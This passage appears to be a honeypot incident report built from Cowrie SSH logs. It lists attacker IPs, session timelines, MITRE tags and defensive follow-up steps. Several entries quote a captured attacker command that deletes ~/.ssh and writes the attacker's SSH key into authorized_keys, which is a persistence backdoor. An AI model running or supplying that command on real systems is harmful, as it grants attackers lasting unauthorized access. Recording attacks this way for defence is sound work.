| **Source IP** | `179.185.18[.]67` |
| **First Seen** | 2026-07-29 12:17 |
| **Last Seen** | 2026-07-29 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:17:38` | `cowrie.session.connect` |
| `2026-07-29 12:17:38` | `cowrie.client.version` |
| `2026-07-29 12:17:38` | `cowrie.client.kex` |
| `2026-07-29 12:17:40` | `cowrie.login.success` |
| `2026-07-29 12:17:41` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:17:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.18[.]67` to AbuseIPDB if not already reported
- [ ] Block `179.185.18[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3156d184cfa

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-29 12:17 |
| **Last Seen** | 2026-07-29 12:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:17:50` | `cowrie.session.connect` |
| `2026-07-29 12:17:51` | `cowrie.client.version` |
| `2026-07-29 12:17:51` | `cowrie.client.kex` |
| `2026-07-29 12:17:52` | `cowrie.login.success` |
| `2026-07-29 12:17:53` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0b60f1563b0

| Field | Detail |
|---|---|
| **Source IP** | `43.130.249[.]176` |
| **First Seen** | 2026-07-29 12:18 |
| **Last Seen** | 2026-07-29 12:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:18:21` | `cowrie.session.connect` |
| `2026-07-29 12:18:21` | `cowrie.client.version` |
| `2026-07-29 12:18:21` | `cowrie.client.kex` |
| `2026-07-29 12:18:22` | `cowrie.login.success` |
| `2026-07-29 12:18:23` | `cowrie.session.params` |
| `2026-07-29 12:18:23` | `cowrie.command.input` |
| `2026-07-29 12:18:23` | `cowrie.command.failed` |
| `2026-07-29 12:18:23` | `cowrie.log.closed` |
| `2026-07-29 12:18:24` | `cowrie.session.params` |
| `2026-07-29 12:18:24` | `cowrie.command.input` |
| `2026-07-29 12:18:24` | `cowrie.session.file_download` |
| `2026-07-29 12:18:24` | `cowrie.log.closed` |
| `2026-07-29 12:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.249[.]176` to AbuseIPDB if not already reported
- [ ] Block `43.130.249[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b73892ecb8d

| Field | Detail |
|---|---|
| **Source IP** | `43.130.249[.]176` |
| **First Seen** | 2026-07-29 12:18 |
| **Last Seen** | 2026-07-29 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:18:24` | `cowrie.session.connect` |
| `2026-07-29 12:18:24` | `cowrie.client.version` |
| `2026-07-29 12:18:25` | `cowrie.client.kex` |
| `2026-07-29 12:18:25` | `cowrie.login.success` |
| `2026-07-29 12:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.249[.]176` to AbuseIPDB if not already reported
- [ ] Block `43.130.249[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d94c8d30a076

| Field | Detail |
|---|---|
| **Source IP** | `43.130.249[.]176` |
| **First Seen** | 2026-07-29 12:18 |
| **Last Seen** | 2026-07-29 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:18:26` | `cowrie.session.connect` |
| `2026-07-29 12:18:26` | `cowrie.client.version` |
| `2026-07-29 12:18:26` | `cowrie.client.kex` |
| `2026-07-29 12:18:27` | `cowrie.login.success` |
| `2026-07-29 12:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.130.249[.]176` to AbuseIPDB if not already reported
- [ ] Block `43.130.249[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ad305a2435

| Field | Detail |
|---|---|
| **Source IP** | `31.77.146[.]148` |
| **First Seen** | 2026-07-29 12:23 |
| **Last Seen** | 2026-07-29 12:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:23:25` | `cowrie.session.connect` |
| `2026-07-29 12:23:25` | `cowrie.client.version` |
| `2026-07-29 12:23:25` | `cowrie.client.kex` |
| `2026-07-29 12:23:26` | `cowrie.login.success` |
| `2026-07-29 12:23:27` | `cowrie.session.params` |
| `2026-07-29 12:23:27` | `cowrie.command.input` |
| `2026-07-29 12:23:27` | `cowrie.command.failed` |
| `2026-07-29 12:23:27` | `cowrie.log.closed` |
| `2026-07-29 12:23:28` | `cowrie.session.params` |
| `2026-07-29 12:23:28` | `cowrie.command.input` |
| `2026-07-29 12:23:28` | `cowrie.session.file_download` |
| `2026-07-29 12:23:28` | `cowrie.log.closed` |
| `2026-07-29 12:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.146[.]148` to AbuseIPDB if not already reported
- [ ] Block `31.77.146[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a308ed27e56

| Field | Detail |
|---|---|
| **Source IP** | `31.77.146[.]148` |
| **First Seen** | 2026-07-29 12:23 |
| **Last Seen** | 2026-07-29 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:23:28` | `cowrie.session.connect` |
| `2026-07-29 12:23:28` | `cowrie.client.version` |
| `2026-07-29 12:23:28` | `cowrie.client.kex` |
| `2026-07-29 12:23:28` | `cowrie.login.success` |
| `2026-07-29 12:23:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.146[.]148` to AbuseIPDB if not already reported
- [ ] Block `31.77.146[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b9fef33d39

| Field | Detail |
|---|---|
| **Source IP** | `31.77.146[.]148` |
| **First Seen** | 2026-07-29 12:23 |
| **Last Seen** | 2026-07-29 12:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:23:28` | `cowrie.session.connect` |
| `2026-07-29 12:23:28` | `cowrie.client.version` |
| `2026-07-29 12:23:29` | `cowrie.client.kex` |
| `2026-07-29 12:23:29` | `cowrie.login.success` |
| `2026-07-29 12:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.77.146[.]148` to AbuseIPDB if not already reported
- [ ] Block `31.77.146[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba7690b0722b

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-07-29 12:33 |
| **Last Seen** | 2026-07-29 12:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:33:30` | `cowrie.session.connect` |
| `2026-07-29 12:33:30` | `cowrie.client.version` |
| `2026-07-29 12:33:30` | `cowrie.client.kex` |
| `2026-07-29 12:33:33` | `cowrie.login.success` |
| `2026-07-29 12:33:34` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2d84f35e61

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-29 12:33 |
| **Last Seen** | 2026-07-29 12:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:33:43` | `cowrie.session.connect` |
| `2026-07-29 12:33:44` | `cowrie.client.version` |
| `2026-07-29 12:33:44` | `cowrie.client.kex` |
| `2026-07-29 12:33:45` | `cowrie.login.success` |
| `2026-07-29 12:33:45` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed61e5276906

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]222` |
| **First Seen** | 2026-07-29 12:37 |
| **Last Seen** | 2026-07-29 12:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:37:32` | `cowrie.session.connect` |
| `2026-07-29 12:37:33` | `cowrie.client.version` |
| `2026-07-29 12:37:33` | `cowrie.client.kex` |
| `2026-07-29 12:37:35` | `cowrie.login.success` |
| `2026-07-29 12:37:36` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:37:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]222` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017c086ef06e

| Field | Detail |
|---|---|
| **Source IP** | `122.160.59[.]87` |
| **First Seen** | 2026-07-29 12:37 |
| **Last Seen** | 2026-07-29 12:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:37:51` | `cowrie.session.connect` |
| `2026-07-29 12:37:52` | `cowrie.client.version` |
| `2026-07-29 12:37:52` | `cowrie.client.kex` |
| `2026-07-29 12:37:54` | `cowrie.login.success` |
| `2026-07-29 12:37:55` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.59[.]87` to AbuseIPDB if not already reported
- [ ] Block `122.160.59[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cadff8baf6a

| Field | Detail |
|---|---|
| **Source IP** | `203.192.247[.]84` |
| **First Seen** | 2026-07-29 12:38 |
| **Last Seen** | 2026-07-29 12:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:38:00` | `cowrie.session.connect` |
| `2026-07-29 12:38:01` | `cowrie.client.version` |
| `2026-07-29 12:38:01` | `cowrie.client.kex` |
| `2026-07-29 12:38:03` | `cowrie.login.success` |
| `2026-07-29 12:38:04` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:38:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.247[.]84` to AbuseIPDB if not already reported
- [ ] Block `203.192.247[.]84` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237c55b73634

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-29 12:43 |
| **Last Seen** | 2026-07-29 12:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:43:24` | `cowrie.session.connect` |
| `2026-07-29 12:43:26` | `cowrie.client.version` |
| `2026-07-29 12:43:26` | `cowrie.client.kex` |
| `2026-07-29 12:43:30` | `cowrie.login.success` |
| `2026-07-29 12:43:31` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5061b023ede

| Field | Detail |
|---|---|
| **Source IP** | `188.219.104[.]210` |
| **First Seen** | 2026-07-29 12:43 |
| **Last Seen** | 2026-07-29 12:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:43:36` | `cowrie.session.connect` |
| `2026-07-29 12:43:36` | `cowrie.client.version` |
| `2026-07-29 12:43:36` | `cowrie.client.kex` |
| `2026-07-29 12:43:37` | `cowrie.login.success` |
| `2026-07-29 12:43:37` | `cowrie.direct-tcpip.request` |
| `2026-07-29 12:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.219.104[.]210` to AbuseIPDB if not already reported
- [ ] Block `188.219.104[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933921ae34ed

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 12:46 |
| **Last Seen** | 2026-07-29 12:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:46:05` | `cowrie.session.connect` |
| `2026-07-29 12:46:05` | `cowrie.client.version` |
| `2026-07-29 12:46:05` | `cowrie.client.kex` |
| `2026-07-29 12:46:05` | `cowrie.login.success` |
| `2026-07-29 12:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b19375af0e02

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 12:46 |
| **Last Seen** | 2026-07-29 12:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:46:07` | `cowrie.session.connect` |
| `2026-07-29 12:46:07` | `cowrie.client.version` |
| `2026-07-29 12:46:07` | `cowrie.client.kex` |
| `2026-07-29 12:46:07` | `cowrie.login.success` |
| `2026-07-29 12:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b1d478fd27c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 12:46 |
| **Last Seen** | 2026-07-29 12:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:46:07` | `cowrie.session.connect` |
| `2026-07-29 12:46:07` | `cowrie.client.version` |
| `2026-07-29 12:46:07` | `cowrie.client.kex` |
| `2026-07-29 12:46:07` | `cowrie.login.success` |
| `2026-07-29 12:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24904be94775

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 12:46 |
| **Last Seen** | 2026-07-29 12:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:46:07` | `cowrie.session.connect` |
| `2026-07-29 12:46:07` | `cowrie.client.version` |
| `2026-07-29 12:46:07` | `cowrie.client.kex` |
| `2026-07-29 12:46:07` | `cowrie.login.success` |
| `2026-07-29 12:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298bc3ae7aa3

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 12:47 |
| **Last Seen** | 2026-07-29 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:47:45` | `cowrie.session.connect` |
| `2026-07-29 12:47:45` | `cowrie.client.version` |
| `2026-07-29 12:47:45` | `cowrie.client.kex` |
| `2026-07-29 12:47:46` | `cowrie.login.success` |
| `2026-07-29 12:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a3cc5c1a55

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 12:47 |
| **Last Seen** | 2026-07-29 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:47:46` | `cowrie.session.connect` |
| `2026-07-29 12:47:46` | `cowrie.client.version` |
| `2026-07-29 12:47:46` | `cowrie.client.kex` |
| `2026-07-29 12:47:46` | `cowrie.login.success` |
| `2026-07-29 12:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c8b0e4b15b2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 12:47 |
| **Last Seen** | 2026-07-29 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:47:55` | `cowrie.session.connect` |
| `2026-07-29 12:47:55` | `cowrie.client.version` |
| `2026-07-29 12:47:55` | `cowrie.client.kex` |
| `2026-07-29 12:47:55` | `cowrie.login.success` |
| `2026-07-29 12:47:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f241faea0e21

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 12:47 |
| **Last Seen** | 2026-07-29 12:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:47:56` | `cowrie.session.connect` |
| `2026-07-29 12:47:56` | `cowrie.client.version` |
| `2026-07-29 12:47:56` | `cowrie.client.kex` |
| `2026-07-29 12:47:56` | `cowrie.login.success` |
| `2026-07-29 12:47:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed05821d2ce

| Field | Detail |
|---|---|
| **Source IP** | `106.243.87[.]164` |
| **First Seen** | 2026-07-29 12:50 |
| **Last Seen** | 2026-07-29 12:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:50:42` | `cowrie.session.connect` |
| `2026-07-29 12:50:42` | `cowrie.client.version` |
| `2026-07-29 12:50:42` | `cowrie.client.kex` |
| `2026-07-29 12:50:43` | `cowrie.login.success` |
| `2026-07-29 12:50:44` | `cowrie.session.params` |
| `2026-07-29 12:50:44` | `cowrie.command.input` |
| `2026-07-29 12:50:44` | `cowrie.command.failed` |
| `2026-07-29 12:50:44` | `cowrie.log.closed` |
| `2026-07-29 12:50:45` | `cowrie.session.params` |
| `2026-07-29 12:50:45` | `cowrie.command.input` |
| `2026-07-29 12:50:45` | `cowrie.session.file_download` |
| `2026-07-29 12:50:45` | `cowrie.log.closed` |
| `2026-07-29 12:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.87[.]164` to AbuseIPDB if not already reported
- [ ] Block `106.243.87[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac67fa9d1823

| Field | Detail |
|---|---|
| **Source IP** | `106.243.87[.]164` |
| **First Seen** | 2026-07-29 12:50 |
| **Last Seen** | 2026-07-29 12:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 12:50:45` | `cowrie.session.connect` |
| `2026-07-29 12:50:46` | `cowrie.client.version` |
| `2026-07-29 12:50:46` | `cowrie.client.kex` |
| `2026-07-29 12:50:47` | `cowrie.login.success` |
| `2026-07-29 12:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.243.87[.]164` to AbuseIPDB if not already reported
- [ ] Block `106.243.87[.]164` at perimeter firewall / security group
